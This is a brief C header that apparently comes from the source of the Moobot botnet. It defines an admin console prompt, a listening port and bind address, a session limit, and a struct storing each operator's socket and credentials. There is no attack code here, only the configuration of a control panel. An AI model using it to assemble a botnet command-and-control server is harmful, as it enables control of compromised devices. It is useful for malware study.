#pragma once

#define ADMIN_CMDLINE	"[%s@moobot] # "

#define ADMIN_PORT		31338
#define ADMIN_BIND		"0.0.0.0"

#define ADMIN_MAX		32

struct user_info_t {
	int fd, auth;
	char *user, *pass;
} user_info[ADMIN_MAX];

void admin_init(void);
